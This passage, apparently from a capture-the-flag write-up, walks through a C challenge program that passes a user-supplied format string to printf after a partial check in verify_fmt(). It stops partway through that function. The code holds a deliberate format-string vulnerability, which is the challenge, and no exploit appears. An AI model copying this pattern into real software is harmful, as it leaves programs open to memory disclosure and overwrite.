</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Get format string */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">getchar</span><span style="--0:#24292E;--1:#E1E4E8">() </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Format string: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">fgets</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(fmt), stdin) </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Verify format string */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">verify_fmt</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, n_args)) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Enjoy! */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">]);</span></div></div></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="int main() {  size_t n_args;  long args[4];  char fmt[256];  setbuf(stdin, NULL);  setbuf(stdout, NULL);  while (1) {    /* Get arguments */    printf(&#34;# of args: &#34;);    if (scanf(&#34;%lu&#34;, &#38;n_args) != 1) {      return 1;    }    if (n_args > 4) {      puts(&#34;[-] Maximum of 4 arguments supported&#34;);      continue;    }    memset(args, 0, sizeof(args));    for (size_t i = 0; i < n_args; i++) {      printf(&#34;args[%lu]: &#34;, i);      if (scanf(&#34;%ld&#34;, args + i) != 1) {        return 1;      }    }    /* Get format string */    while (getchar() != '\n');    printf(&#34;Format string: &#34;);    if (fgets(fmt, sizeof(fmt), stdin) == NULL) {      return 1;    }    /* Verify format string */    if (verify_fmt(fmt, n_args)) {      continue;    }    /* Enjoy! */    printf(fmt, args[0], args[1], args[2], args[3]);  }  return 0;}"><div></div></button></div></figure></div>
<p>The main() function turns buffering off and enter a while-loop.</p>
<p>First it takes the number of arguments which can’t be greater than 4. And, sets the args to zero to prevent garbage values and takes value for each argument.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:51ch"><code><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Get arguments */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# of args: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#AE4B07;--1:#FFAB70">n_args</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (n_args </span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[-] Maximum of 4 arguments supported&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">memset</span><span style="--0:#24292E;--1:#E1E4E8">(args, </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(args));</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">; i </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> n_args; i</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;args[</span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF">]: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, i);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%ld</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, args </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> i) </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="    /* Get arguments */    printf(&#34;# of args: &#34;);    if (scanf(&#34;%lu&#34;, &#38;n_args) != 1) {      return 1;    }    if (n_args > 4) {      puts(&#34;[-] Maximum of 4 arguments supported&#34;);      continue;    }    memset(args, 0, sizeof(args));    for (size_t i = 0; i < n_args; i++) {      printf(&#34;args[%lu]: &#34;, i);      if (scanf(&#34;%ld&#34;, args + i) != 1) {        return 1;      }    }"><div></div></button></div></figure></div>
<p>After taking the arguments it reads a string and calls <code>verify_fmt()</code> on our input string and if the return value is 0 it’s calls <code>printf()</code> on our string with the arguments we specified.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:52ch"><code><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Get format string */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">getchar</span><span style="--0:#24292E;--1:#E1E4E8">() </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Format string: &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">fgets</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8">(fmt), stdin) </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Verify format string */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">verify_fmt</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, n_args)) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Enjoy! */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(fmt, </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#AE4B07;--1:#FFAB70">args</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">]);</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="    /* Get format string */    while (getchar() != '\n');    printf(&#34;Format string: &#34;);    if (fgets(fmt, sizeof(fmt), stdin) == NULL) {      return 1;    }    /* Verify format string */    if (verify_fmt(fmt, n_args)) {      continue;    }    /* Enjoy! */    printf(fmt, args[0], args[1], args[2], args[3]);"><div></div></button></div></figure></div>
<p>Let’s take a look at the <code>verify_fmt()</code> function which takes the our input string <code>fmt</code> and the <code>n_args</code> as argument.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:68ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">verify_fmt</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">n_args</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> argcnt </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> len </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">strlen</span><span style="--0:#24292E;--1:#E1E4E8">(fmt);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">; i </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> len; i</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[i] </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;%&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[i</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;%&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">i</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">isdigit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[i</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">])) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[-] Positional argument not supported&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (argcnt </span><span style="--0:#BF3441;--1:#F97583">&gt;=</span><span style="--0:#24292E;--1:#E1E4E8"> n_args) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[-] Cannot use more than </span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF"> specifiers</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, n_args);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code">
